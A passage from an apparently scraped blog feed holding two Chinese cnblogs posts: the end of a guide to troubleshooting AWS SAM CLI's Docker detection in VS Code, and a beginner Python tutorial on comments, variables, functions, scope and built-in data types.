ps</code>&nbsp;报“Cannot connect to the Docker daemon”等错误。</p>\n</li>\n</ul>\n<p><strong>定位方式</strong></p>\n<ul>\n<li>\n<p>打开 VS Code 集成终端，执行&nbsp;<code>docker ps</code>、<code>docker info</code>。</p>\n</li>\n<li>\n<p>如果这里都失败，基本优先检查 Docker 安装和启动状态。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n</ul>\n<hr />\n<h3 id=\"32-vs-code-所在环境与-docker-不在同一个世界\">3.2 VS Code 所在环境与 Docker 不在同一个“世界”</h3>\n<p>这是第二类很常见的问题：<strong>你在 A 终端里能用 Docker，但 VS Code 使用的是 B 环境</strong>。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n<p>典型情形：</p>\n<ul>\n<li>\n<p>在 Windows 上用 WSL 打开工程，而 Docker Desktop 只在 Windows 环境可见；VS Code 的调试在 WSL 里跑，WSL 内没有可用的 Docker socket。</p>\n</li>\n<li>\n<p>使用 Dev Container / Remote-SSH / Remote-WSL 等远程开发模式，但容器/远程环境内部没有 Docker 或没有映射 Docker socket。</p>\n</li>\n<li>\n<p>手动开终端时用的是一个 shell profile，设置了一些变量或 alias，而 VS Code 集成终端没有加载同样的配置。</p>\n</li>\n</ul>\n<p><strong>定位方式</strong></p>\n<ul>\n<li>\n<p>一律在 VS Code 集成终端中执行：<code>docker ps</code>、<code>sam local invoke</code>，看输出和普通终端是否一致。</p>\n</li>\n<li>\n<p>如果普通终端 OK，VS Code 里失败，就可以讲：<br />\n“问题在于 VS Code 运行 SAM CLI 的环境，与我平时用的终端环境不一样。”[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n</ul>\n<hr />\n<h3 id=\"33-docker_host--docker-context-配置把-sam-带偏\">3.3 DOCKER_HOST / Docker context 配置把 SAM “带偏”</h3>\n<p>当使用过远程 Docker、Colima、Rancher Desktop 等工具时，很容易留下旧的&nbsp;<code>DOCKER_HOST</code>&nbsp;环境变量或非默认 Docker context。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n<p><strong>典型问题</strong></p>\n<ul>\n<li>\n<p><code>DOCKER_HOST</code>&nbsp;指向一个已经不存在或不可达的远程 Docker。</p>\n</li>\n<li>\n<p>当前 Docker context 是某个远程/实验环境，而不是本地 Desktop。</p>\n</li>\n<li>\n<p>用&nbsp;<code>docker ps</code>&nbsp;可能还显示得正常，但实际连的是某个奇怪的 host。</p>\n</li>\n</ul>\n<p><strong>排查与修复</strong></p>\n<ul>\n<li>\n<p>在 VS Code 集成终端中查看环境变量：</p>\n<ul>\n<li>\n<p>Linux/macOS:&nbsp;<code>env | grep DOCKER_HOST</code></p>\n</li>\n<li>\n<p>PowerShell:&nbsp;<code>Get-ChildItem Env:DOCKER_HOST</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>如果有值，可以尝试临时&nbsp;<code>unset</code>&nbsp;/&nbsp;<code>Remove-Item Env:DOCKER_HOST</code>，再试一次本地调试。</p>\n</li>\n<li>\n<p>查看 Docker context：<code>docker context ls</code>，确认当前 active 的 context 是否是预期的本地环境。</p>\n</li>\n<li>\n<p>若问题解决，可以在分享中强调：<br />\n“遇到 Docker 明明在跑却被认为‘不可用’时，记得检查 DOCKER_HOST 和 docker context。”[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n</ul>\n<hr />\n<h3 id=\"34-docker-版本升级后sam-cli--工具链版本太旧你的实际案例\">3.4 Docker 版本升级后，SAM CLI / 工具链版本太旧（你的实际案例）</h3>\n<p>这是你这次遇到的核心原因，也非常适合重点讲解。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n<p><strong>现象</strong></p>\n<ul>\n<li>\n<p>Docker Desktop 升级到新版本之后，<code>docker ps</code>&nbsp;等命令都正常。</p>\n</li>\n<li>\n<p>但通过 VS Code（AWS Toolkit）点击本地运行 Lambda，提示仍然是 “Running AWS SAM projects locally requires Docker…”。</p>\n</li>\n<li>\n<p>手动在终端执行&nbsp;<code>sam local invoke</code>&nbsp;或&nbsp;<code>sam local start-api</code>&nbsp;可能也会报类似“Docker 不可达”或 API 相关的错误。</p>\n</li>\n</ul>\n<p><strong>原因</strong></p>\n<ul>\n<li>\n<p>老版本的 AWS SAM CLI 内部依赖的 Docker 客户端库，对新 Docker API 或某些行为不兼容。</p>\n</li>\n<li>\n<p>VS Code 的 AWS Toolkit 也有对 SAM CLI 或 Docker 的版本要求，如果太旧，检测逻辑会失败。</p>\n</li>\n<li>\n<p>结果就是：<strong>Docker 实际可用，但健康检查阶段就“挂了”，于是前端统一抛出“需要安装 Docker”这种误导性的错误信息</strong>。[<a href=\"https://stackoverflow.com/questions/50791354/running-aws-sam-projects-locally-get-error\" rel=\"noopener nofollow\" target=\"_blank\">stackoverflow</a>]​</p>\n</li>\n</ul>\n<p><strong>解决方式</strong></p>\n<ul>\n<li>\n<p>升级 AWS SAM CLI 到最新稳定版本。</p>\n</li>\n<li>\n<p>升级 VS Code 中的 AWS Toolkit（以及如有需要的 AWS CLI 等依赖）。</p>\n</li>\n<li>\n<p>升级后再次尝试本地运行 Lambda，问题消失。</p>\n</li>\n</ul>\n<p>这一段可以作为你分享里“真正踩坑”的部分，强调“Docker 升级后别忘了升级 SAM / 工具链”。</p>\n<hr />\n<h2 id=\"四推荐的排查顺序可以直接投屏的一张-slide\">四、推荐的排查顺序（可以直接投屏的一张 slide）</h2>\n<p>你可以整理成一个“故障排查流程”：</p>\n<ol>\n<li>\n<p><strong>确认 Docker 真的在 VS Code 环境里可用</strong></p>\n<ul>\n<li>在 VS Code 集成终端执行&nbsp;<code>docker ps</code>、<code>docker info</code>。</li>\n</ul>\n</li>\n<li>\n<p><strong>检查环境是否一致</strong></p>\n<ul>\n<li>\n<p>是否在 WSL / Dev Container / 远程环境中？</p>\n</li>\n<li>\n<p>这些环境里是否也安装/映射了 Docker？</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>检查 DOCKER_HOST 和 Docker context</strong></p>\n<ul>\n<li>移除可疑的&nbsp;<code>DOCKER_HOST</code>；确认当前 context 正确。</li>\n</ul>\n</li>\n<li>\n<p><strong>检查版本兼容</strong></p>\n<ul>\n<li>\n<p>Docker Desktop 是否刚升级？</p>\n</li>\n<li>\n<p><code>sam --version</code>&nbsp;是否很老？</p>\n</li>\n<li>\n<p>升级 AWS SAM CLI、AWS Toolkit 等工具到最新版本。</p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>再次从 VS Code 中发起本地调试</strong></p>\n<ul>\n<li>验证问题是否解决。</li>\n</ul>\n</li>\n</ol>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 11:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/wanghaiwei\">游学者</a>&nbsp;\n阅读(<span id=\"post_view_count\">10</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Python å­¦ä¹ ç¬”è®°ï¼šåŸºç¡€è¯­æ³•å­¦ä¹",
      "link": "https://www.cnblogs.com/owlman/p/19505712",
      "published": "",
      "description": "<h2 class=\"post-title\">\n            <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/owlman/p/19505712\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 11:34\">\n    <span>Python 学习笔记：基础语法学习</span>\n    \n\n</a>\n\n        </h2>\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>[!NOTE] 笔记说明</p>\n<p>根据之前在《[[关于Python的学习|Python 学习路系统图规划]]》一文中的规划，这篇笔记中将会具体记录我在学习 Python 的基础语法规则过程中的一些心得体会与编程练习，它们将主要聚焦于以下议题：</p>\n<ul>\n<li>了解在 Python 代码中会出现的注释、变量、操作符以及表达式等基本元素；</li>\n<li>了解 Python 的内置数据类型、自定义类型以及它们可执行的相关操作；</li>\n<li>了解如何在 Python 中使用函数、对象以及模块来实现面向过程/对象的编程；</li>\n</ul>\n</blockquote>\n<p>自《The C Programming Language》这本在编程语言领域中被誉为“圣经”的经典教材问世以来，在命令行终端环境中输出带有“Hello World”字样的信息已经成为了人们学习一门新的编程语言，或者测试该语言的执行环境是否正常的第一个演示程序。这样做不仅可以先让我们对自己要学习的编程语言及其执行环境有一个整体的印象，同时也为该语言的基础语法学习提供了一个切入点。接下来，就让我们闲话少说，先从《[[编程环境配置]]》那篇笔记末尾的那版 Hello World 程序开始聊起吧，其代码如下所示。</p>\n<pre><code class=\"language-python\">#! /usr/bin/env python\n'''\n    Simple example to say hello\n    \n    Author: lingjie\n    Created on: 2024-06-15\n    '''\n\nauthor_name = \"owlman\"\ndef say_hello(name: str) -&gt; None:\n    '''\n        Say hello by name.\n     \n        Args:\n            name: name to greet\n    '''\n    print(\"Hello World! My name is\", name)\n\nif __name__ == \"__main__\":\n    say_hello(author_name)\n</code></pre>\n<h2 id=\"为代码编写注释\">为代码编写注释</h2>\n<p>在上述代码中，我们首先看到的应该是注释信息。通常情况下，程序员们编写注释的目的是让阅读代码的人能更好地理解自己的设计意图，这对于代码的后期测试和维护工作有着非常重要的现实意义。在 Python 的语法规则中，注释主要有以下两种形式。</p>\n<ul>\n<li>\n<p><strong>以<code>#</code>符号开头的单行注释</strong>：这种形式的注释可以在代码的任意地方以<code>#</code>符号开头编写注释信息，直至其所在行结束为止，例如像下面这样。</p>\n<pre><code class=\"language-python\"># Python 支持加法运算\nx = 7\ny = 8\nz = x + y # 请问 z = ？\n</code></pre>\n</li>\n<li>\n<p><strong>用三个单引号包括起来的字符串</strong>：严格来说，这种形式的字符串并不属于真正的注释语法。但由于它可以被放置在代码中的任何位置上，并且可用于呈现包含换行符的长文本信息，所以常被程序员们用来编写多行注释，例如像下面这样。</p>\n<pre><code class=\"language-python\">'''\n示范 Python 中的加法运算\n涉及变量：x、y、z\n'''\n\nx = 7\ny = 8\nz = x + y\nprint(\"z = \", z)\n</code></pre>\n<p><strong>需要再次强调的是</strong>，如果严格按照 Python 的语法规则来说，上述字符串的作用与纯粹的注释语法并不完全相同。虽然在大多数情况下，这种形式的字符串不会对代码的执行产生任何影响，但如果我们将这种字符串放置在了函数或类定义的开头，它就会被当作该函数或类的<strong>文档字符串（docstring）</strong>来处理，这可以通过<code>help()</code>函数来查看该函数或类的文档说明。例如在上面的 Hello World 程序中，我们就使用了这种多行字符串对象为<code>say_hello()</code>函数编写了一个文档字符串。读者可以通过在 Python 的交互式界面中输入<code>help(say_hello)</code>命令来查看该函数的文档说明，具体如图 1 所示。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 1</strong>：Python 中的文档字符串</p>\n</li>\n</ul>\n<p>正如我们之前所说，注释存在的目的是说明程序员编写相关代码的意图，以此来提高代码的可读性，方便日后的测试与维护工作。例如在上面这段示例代码中，我们用注释说明了它用于示范在 Python 中执行加法运算，并使用了<code>x</code>、<code>y</code>、<code>z</code>三个变量，当然了，编写这种画蛇添足式的注释在实际生产环境中并不值得鼓励。因为，我们必须考虑到 Python 本身就是一门用于表达信息的语言，它的作用除了让机器按照它的意图正确执行之外，也应该让使用这门语言的人类看得懂它的意图。<strong>注释的作用只能是辅助说明，可不是充当 Python 自身的翻译</strong>。换而言之，我们应该尽量用代码本身来表达它所要表达的意图，而不是处处都借助注释。</p>\n<p>除了说明代码的意图之外，注释还有一个额外的作用：<strong>在调试过程中临时去除某一行代码</strong>。举个例子，如果我在调试下面这几行代码的时候发现自己的命令行终端不能显示中文，为了确定这不是代码本身的问题，我可能会选择像下面这样，临时注释掉中文的输出，然后增加一条英文的输出。在很多时候，这种利用注释语法来临时切换要执行的代码，也是一种很常用的代码调试技巧。</p>\n<pre><code class=\"language-python\">name = \"lingjie\"\n# print(\"你好！\", name)\nprint(\"Hello \", name)\n</code></pre>\n<h2 id=\"变量与函数\">变量与函数</h2>\n<p>下面，让我们继续之前 Hello World 程序的讲解。读者在看完该程序的注释说明之后，接下来会看到的是一个用于定义变量或函数的语句。众所周知，由于编程语言是一种表达思维更接近于数学的人类语言，所以我们在用它描述一件事物时，通常需要先完成对它的定义，例如，描述一个数据，通常需要先定义一个变量，描述一组操作，通常需要先定义一个函数。下面，就让我们从变量的定义开始，带读者逐步了解如何使用 Python 来描述一件自己想让计算机完成的事情吧！</p>\n<h3 id=\"变量的定义\">变量的定义</h3>\n<p>“变量\"这个概念最早源自于数学中的代数运算，为了方便演算过程的书写，我们通常会用一些简单的字母来指代演算过程中不断变化的已知量或未知量，毕竟在公式中写<code>x</code>、<code>y</code>、<code>z</code>这样的字母总是要比写 <span class=\"math inline\">\\(10^{55}\\)</span> 这样的数字或者 <span class=\"math inline\">\\(\\sum_{i=0}^{n}\\)</span> 这样的表达式简单方便多了。而到了计算机编程语言中，变量的概念得到了进一步扩展，除了是某个数据值的指代外，它还关联着计算机中用于存储该数据的一块内存空间，换而言之，变量现在还是程序用来存储某个数据的容器。当然了，这些容器既然能被称为“变”量，也就说明它们所存储的数据是会随着程序的执行而变化的。由于变量是程序所要操作的基本对象，所以在编写程序时，定义变量往往是我们首先要做的工作。具体到 Python 中，用于定义变量的语法规则如下。</p>\n<pre><code class=\"language-python\">[变量名] = [变量值]\n</code></pre>\n<p>在这里，<code>[变量名]</code>是我们要定义的变量名称，<code>[变量值]</code>则是我们要使用该变量描述的数据。例如在之前的 Hello World 程序中，<code>author_name = \"lingjie\"</code>就是一个标准的变量定义语句，其中的<code>author_name</code>就是<code>[变量名]</code>，而<code>\"lingjie\"</code>则是<code>[变量值]</code>。</p>\n<p>下面，让我们先来具体讨论一下<code>[变量名]</code>的设置问题。和绝大多数编程语言一样，Python 中的变量名可以由字母、数字与下划线以任何顺序排列组合而成，其中不能包含空格符以及<code>-</code>、<code>$</code>这样的特殊符号，并且只能以字母、下划线开头，像下面这些变量名都是不被允许的：</p>\n<pre><code class=\"language-python\">$dollar = 100\n2day = 10\n'Week =11\n\\Month = 12\n/Year = 14\nmy-name = \"lingjie\"\n</code></pre>\n<p>除此之外，我们所使用的变量名还需要注意避开 Python 语言自身要使用的关键字，我们可以利用语言标准库中一个名为<code>keyword</code>的模块来获取当前已被 Python 占用的所有关键字，具体如图 2 所示。</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 2</strong>：Python 中的关键字</p>\n<p>当然了，出于代码可读性方面的考虑，我们在选择变量名的时候还应该尽量使用有意义的单词或单词组合，不能太过随意。在这里，笔者个人更倾向于建议读者应在变量的命名上遵守某种一致的命名规范。譬如驼峰命名法，遵守这种命名规范的变量名通常由一个以上的单词组成，除了首个单词的字母不是大写，其余所有单词的首字母均为大写，例如<code>myName</code>、<code>myBook</code>、<code>someValue</code>、<code>getObject</code>等。而在 Python 社区中，人们通常更倾向于使用下划线来分隔英文单词的蛇形命名法来命名变量，例如<code>my_name</code>、<code>my_book</code>、<code>some_value</code>、<code>get_object</code>等。虽然这些命名规范并不是强制性的，但它们可以帮助我们更好地理解代码的意图，尤其是在团队协作中，遵守统一的命名规范更是至关重要。</p>\n<p>在掌握了<code>[变量名]</code>的设置方法之后，我们就可以接着来讨论<code>[变量值]</code>的设置问题了。如果读者之前学习过 C/C++/Java 这类编程语言，想必一定会发现在 Python 中定义变量是不需要声明变量类型的。因为 Python 是一门动态类型语言，它会在运行时自动根据变量值的类型来决定该变量的类型。也就是说，Python 语言中的变量是可以随时改变其存储的数据类型的。例如，我们可以先将一个整数值赋给一个变量，然后再将一个字符串值赋给同一个变量，这样就可以让该变量的类型从整数变成字符串了，就像下面这样：</p>\n<pre><code class=\"language-python\">x = 100          # 将整数值赋给变量 x\nprint(x)         # 输出变量 x 的值为 100\nx = \"lingjie\"    # 再将字符串值赋给同一个变量 x\nprint(x)         # 输出变量 x 的值为 \"lingjie\"\n</code></pre>\n<p>至于 Python 的变量中究竟可以存储哪些类型的数据，我稍后会在讨论“对象与数据类型”这一议题时再详细介绍。现在，读者只需要知道在 Python 中定义变量时，我们只需要指定变量名和变量值即可。</p>\n<h3 id=\"函数的定义\">函数的定义</h3>\n<p>和变量一样，“函数”这个概念最早也源自于数学，用于描述运算变量之间的关系。例如三角函数中的正弦函数 <span class=\"math inline\">\\(y = sin(x)\\)</span>，它描述的是一个变量 <span class=\"math inline\">\\(x\\)</span> 与另一个变量 <span class=\"math inline\">\\(y\\)</span> 之间的关系。随着计算机编程语言的发展，函数的概念也得到了相应的扩展，它现在不仅可以表示两个变量之间的关系，还可以表示一组操作的集合，这些操作可以接受输入并返回输出。换而言之，函数就是一组可以被调用来执行特定任务的代码块。在 Python 中，函数定义语句的语法规则如下。</p>\n<pre><code class=\"language-python\">def [函数名称]([参数列表]) -&gt; [返回值类型]:\n    '''\n    [功能说明]\n    '''\n    [函数主体]\n</code></pre>\n<p>正如读者所见，按照 Python 的语法规则，函数的定义语句必须要以<code>def</code>这个关键字开头，然后需依次定义<code>[函数名称]</code>、<code>[参数列表]</code>、<code>[功能说明]</code>以及要执行的<code>[函数主体]</code>，其具体说明如下：</p>\n<ul>\n<li><code>[函数名称]</code>是被定义函数的名称，在 Python 中，函数的命名规则与变量是一样的，读者可以自行参考之前关于变量命名规则的介绍来了解更多细节。</li>\n<li><code>[参数列表]</code>是调用函数时需要传入的参数列表，它可以为空，也可以包含一个或多个参数。每个参数之间用逗号隔开，参数的命名规则同样与变量名一致。在 Python 3.5 之后的版本中，我们还可以通过<code>参数名:参数类型标注</code>的形式来标注相应参数的类型，例如<code>name:str</code>、<code>age:int</code>、<code>height:float</code>等。但需要注意的是，参数类型的标注语法是可选的、也不具备强制性的约束，换言之，它并不会在函数被调用时对传入的参数值进行实际的类型检查，但它可以帮助我们更好地理解代码的意图。</li>\n<li><code>-&gt; [返回值类型]</code>是函数返回值的类型标注语法，它也是可选的，用于说明该函数的返回值类型。同样需要注意的是，它也不会在函数被调用时对返回值进行实际的类型检查。</li>\n<li><code>[功能说明]</code>是之前演示过的文档字符串，它是一个用于描述函数功能和用法的多行字符串，通常位于函数定义的第一行。在函数的功能过于简单时，这个说明可以省略不写，但在函数的功能较为复杂时，编写一个清晰的功能说明是非常有必要的。</li>\n<li><code>[函数主体]</code>是函数的具体实现部分，其中包含了该函数执行的所有代码。</li>\n</ul>\n<p>如果具体到 Hello World 程序中，<code>[函数名称]</code>对应的就是<code>say_hello</code>，<code>[参数列表]</code>在这里就是一对小括号中的<code>name:str</code>，而<code>[功能说明]</code>则是我们之前在 Python 交互式终端中使用<code>help</code>函数展示过的那个文档字符串。最后，其<code>[函数主体]</code>中只有一条用于打印文本信息的语句。</p>\n<h3 id=\"作用域与命名空间\">作用域与命名空间</h3>\n<p>与 C/C++/Java 这类大家熟悉的编程语言相比，Python 语法的最大特色之一就是：它不是使用大括号，而是使用文本缩进格式来表示不同的作用域。因此，我们可以在用于函数定义的语法规则中看到，<code>[函数主体]</code>所在的区域与<code>def</code>所在的行之间存在着四个空格的文本缩进，这代表着它们属于不同的作用域。<strong>需要注意的是</strong>：虽然在 Python 的语法规则上，定义作用域的缩进所使用的空格数是可变的，但同一级作用域使用的缩进必须保持相同的空格数，否则就会出现错误。</p>\n<p>在同一个作用域内，我们通常都有一个独立的变量命名空间可以使用，读者可以在其中定义多个局部变量，并编写多行语句来执行与这些变量相关的操作，完全不必担心当前作用域所使用的变量名与某个全局作用域或其他作用域中的变量冲突。例如，如果我们在之前的 Hello World 程序中新增一个名为<code>say_hello_to_me</code>的函数，并在该函数重新定义一个名为<code>author_name</code>的变量，那么它就会覆盖掉之前定义的全局变量<code>author_name</code>，从而使得该函数内部的代码可以使用这个变量名来引用新的值，具体如下。</p>\n<pre><code class=\"language-python\">author_name = \"owlman\"  # 全局变量   \n\ndef say_hello(name: str) -&gt; None:\n    '''\n        Say hello by name.\n     \n        Args:\n            name: name to greet\n    '''\n    print(\"Hello World! My name is\", name)\n\ndef say_hello_to_me() -&gt; None:\n    '''\n        Say hello to myself.\n    '''\n    author_name = \"lingjie\" # 局部变量\n    say_hello(author_name)\n\nif __name__ == \"__main__\":\n    say_hello(author_name)  # 输出：Hello World! My name is owlman\n    say_hello_to_me()       # 输出：Hello World! My name is lingjie\n</code></pre>\n<p>上述修改的执行结果如图 3 所示，读者可以看到，在<code>say_hello_to_me</code>函数中重新定义的<code>author_name</code>变量并没有影响到全局变量的值。</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 3</strong>：Python 中的作用域</p>\n<p>在 Python 中，除了全局作用域和局部作用域之外，还有一类作用域通常称为“内置作用域”（builtins）。它由 Python 的内置名称组成（由内置模块 builtins 提供），例如内置函数 print 就属于这个作用域。内置名称在名称查找的 LEGB 顺序中位于最后一步，通常可以在任何地方使用，但也可以被局部或全局同名变量覆盖（shadow）。</p>\n<h2 id=\"对象与数据类型\">对象与数据类型</h2>\n<p>现在，让我们再回过头来重点关注一下变量中可以存储的数据类型。在计算机中，如果程序想要对某一块内存空间中数据进行存储和操作，首先要明确的是该空间内数据的存储形式和操作方法。譬如，变量中存储的是数据本身还是数据在内存中的位置？这将决定着这些数据的复制方式。再譬如，变量中的数据可以执行什么操作？是算术运算还是逻辑判断，亦或是文本处理？这就需要我们对这些内存空间中的数据，即变量的值进行归类，譬如用来做算术运算的数据归为一类，用于文本处理的数据则归为另一类，在编程术语上，这些归类被人们约定俗成地称之为“类型（type）”。简而言之，就是变量中的值所属的类型决定了该变量的存储形式及其可以执行的操作。下面，我们具体介绍一下在 Python 中可以使用的数据类型，先从该语言支持的基本数据类型开始。</p>\n<h3 id=\"基本数据类型\">基本数据类型</h3>\n<p>在编程语言中，基本数据类型指的是语言本身内置的、可以直接使用的数据类型。Python 语言中支持的基本数据类型主要有以下六种：</p>\n<ul>\n<li>\n<p><strong><code>number</code>类型</strong>：即数字类型，Python 主要支持的数字类型分别是：<code>int</code>（整数类型）、<code>float</code>（浮点类型）、<code>bool</code>（布尔类型）、<code>complex</code>（复数类型）。这些数据类型可用于执行各种数学运算，包括加法、减法、除法、整除、取余、乘法和乘方等，下面是一些操作示例：</p>\n<pre><code class=\"language-python\">print(3+2)         # 加法运算，输出结果是 5\nprint(10.4-3)      # 减法运算，输出结果是 7.4\nprint(15/4)        # 除法运算，输出结果是 3.75\nprint(15//4)       # 整除运算，输出结果是 3\nprint(15%4)        # 取余运算，输出结果是 3\nprint(2*3)         # 乘法运算，输出结果是 6\nprint(2**3)        # 乘方运算，输出结果是 8\n</code></pre>\n<p><em>值得一提的是</em>，Python 在 3.x 版本之后采用了非固定大小的<code>int</code>类型，这让它可以自动适应任意大小的整数值（唯一的限制是计算机的可用内存量）。在处理较小的整数时，Python 会使用计算机底层的<code>int</code>类型来表示它们。当需要处理较大的整数时，Python 就会自动转换为占用位数更多的表示形式。当然，为了能对较大的整数值执行运算，Python 必须要将这些运算拆解成若干个能直接交给计算机硬件处理的小型运算单元，其拆解过程与我们用笔算的方式来进行长除法运算非常类似。尽管这种运算方式的效率并不高（因为这需要执行更多步骤），但是它们允许 Python 将<code>int</code>类型扩展至任意大小。</p>\n</li>\n<li>\n<p><strong><code>string</code>类型</strong>：即字符串类型。在 Python 语言中，字符串类型的数据就是由一对单引号、双引号或三引号括住的一段文本信息，这段文本中所有的空格和制表符都照原样保留。在三种字符串的表示方式中，单引号与双引号的作用在大多数时候是一样的，只有当字符串本身的内容中包含单引号时，它就只能用双引号或三引号来表示。而三引号则通常用于表示包含多行文字的字符串，同样的，我们也可以在三引号中自由使用单引号和双引号。在编程活动中，字符串类型的数据主要用于执行各种文本处理操作，包括文本的输入、输出、存储、拼接和截取等，下面是一些操作示例：</p>\n<pre><code class=\"language-python\">name = \"lingjie\"                   # 存储一般的字符串数据\nI_am = \"I'm \"                      # 存储带单引号的字符串数据\nother = '''\nage:  42\njob: writer\n'''                                # 存储多行字符串数据\nmessage = I_am + name + other      # 拼接字符串数据并存储\n\nprint(message)                     # 输出变量 message 中存储的字符串数据\nprint(message[0:11])               # 截取变量中的某一段字符串并输出\nprint(r\"Newlines are indicated by \\n\") # 忽略字符串中的转义字符并输出\n</code></pre>\n<p>另外，如果读者想要让 Python 运行时环境忽略字符串数据中所有的转义字符，也可以在表示字符串的单引号或双引号之前加一个前缀<code>r</code>。例如在上面的最后一行代码中，如果我们希望的是原样输出下面字符串中的换行符<code>\\n</code>，而不是让它发挥换行效果。</p>\n</li>\n<li>\n<p><strong><code>list</code>类型</strong>：即列表类型。在 Python 语言中，列表类型的数据就是由一对中括号括住的对象序列，序列中的这些对象彼此之间需用逗号隔开，通常被称为列表的元素。这些元素可以是 Python 支持的任意数据类型，既可以是这里正在介绍的六大基本数据类型，也可以是我们稍后要介绍的自定义类型，或者通过引入第三方库获得的扩展数据类型。在基于 Python 的编程中，列表类型的数据可用于执行针对一整个元素序列的相关操作，例如成批量地执行增、删、改、查以及排序等操作，下面是一些操作示例：</p>\n<pre><code class=\"language-python\">list_1 = [                  # 将三个不同类型的数据存储为列表的元素\n    10,                     # 列表的第一个元素为数字类型的数据\n    \"string data\",          # 列表的第二个元素为字符串类型的数据\n    [1, 2, 3]               # 列表的第三个元素为列表类型的数据\n]\nprint(list_1)               # 输出列表中的所有元素\nprint(list_1[1])            # 输出索引值为 1 的元素\nprint(list_1[0:2])          # 使用切片操作指定要输出的列表子序列\n# 请注意：列表的索引值是从 0 开始的，所以这里输出的是第二个元素\nlist_1[0] = 100             # 将索引值为 0 的元素修改为 100\nlist_1.remove([1,2,3])      # 找到并删除列表中的第三个元素\nprint(list_1)               # 重新输出列表中的所有元素\nlist_1.append([7, 8, 9])    # 在列表末尾重新添加元素\nprint(list_1)               # 重新输出列表中的所有元素\n</code></pre>\n</li>\n<li>\n<p><strong><code>tuple</code>类型</strong>：即元组类型。在 Python 语言中，元组类型的数据可以被视为一个只读的列表。元组中的元素也可以是任意类型的数据，这些元素会被放置在一对小括号中，并用逗号隔开。由于元组中的元素是不可修改的，所以该数据类型通常用于执行一次性的批量数据存储以及各种查找、遍历等只读操作，下面是一些操作示例:</p>\n<pre><code class=\"language-python\">tuple_1 = (\"abcd\", 706, \"lyy\", 898, 5.2)    # 将一些数据存储为元组的元素\nprint(tuple_1)                              # 输出元组中的所有元素\nprint(tuple_1[0])                           # 输出索引值为 0 的元素 \nprint(tuple_1[1:3])                         # 使用切片操作指定要输出的元组子序列\n</code></pre>\n</li>\n<li>\n<p><strong><code>set</code>类型</strong>：即集合类型。在 Python 语言中，集合类型的数据可以被视为一个元素不能重复的列表。集合中的元素被放置在一对大括号中，并用逗号隔开。当然，考虑到<code>{}</code>同时也是稍后要介绍的字典类型所使用的符号，空集合就需要调用<code>set()</code>函数来完成初始化了。由于集合中的元素是不能重复的，所以该数据类型通常用于在执行数据存储时需要删除冗余数据的操作，下面是一些操作示例：</p>\n<pre><code class=\"language-python\">set_0 = set()               # 空集合需要通过调用 set() 来完成初始化\nset_1 = {18,19,18,20,21,20} # 如果存储到集合中的元素存在重复\nprint(set_1)                # 我们就会看到相同的元素只会被保留一个\n</code></pre>\n</li>\n<li>\n<p><strong><code>dictionary</code>类型</strong>：即字典类型。在 Python 语言中，字典类型的数据可以被视为一个元素为<code>[键]:[值]</code>结构的列表。字典中的每个元素都必须是一个<code>[键]:[值]</code>结构的数据，它们将会被放置在一对大括号中，并用逗号隔开。该数据类型通常用于执行一些键值查找相关的操作，下面是一些操作示例：</p>\n<pre><code class=\"language-python\">map_1 = { # 将两个[键]:[值]结构的数据存储为字典的元素\n    \"name\" : \"lingjie\",    # name 是键，lingjie 是值\n    \"age\" : \"25\"           # age 是键，25 是值\n}\nprint(map_1)               # 输出字典中的所有元素\nmap_1[\"sex\"] = \"boy\"       # 添加一个键为 sex，值为 boy 的元素 \nprint(map_1)               # 重新输出字典中的所有元素\n\n# 如果想删除字典中的指定元素时，可以使用 del 语句来完成\ndel map_1[\"age\"]           # 删除键为 age 的元素\nprint(map_1)               # 重新输出字典中的所有元素\n</code></pre>\n</li>\n</ul>\n<h3 id=\"自定义类型\">自定义类型</h3>\n<p>除了上述基本数据类型之外，Python 语言还支持程序员通过自定义类型的方式来引入更复杂的数据类型，以便获得更强大的表达能力。和绝大多数支持面向对象的编程语言一样，这一扩展可用数据类型的能力是通过一种叫做“类定义”的语句来完成的，该语句的语法规则具体如下。</p>\n<pre><code class=\"language-python\">class [类型名称]([父类]):\n    '''\n    [类型的功能说明]\n    '''\n    [类型的属性和方法]\n</code></pre>\n<p>在面向对象设计的概念中，“类”可以被视为是对某一种数据类型的结构描述。这种描述通常是抽象的，Python 解释器需要负责将该抽象描述具现化为内存中实际可操作的数据，这一过程被称为“实例化”，实例化的结果则被称为该类型的“实例”或“对象”。而这种抽象化的描述通常主要由 <strong>属性</strong> 和 <strong>方法</strong> 两部分组成。在了解了这些概念之后，我们就可以开始对上述语法规则做一个具体的解释了。</p>\n<p>在 Python 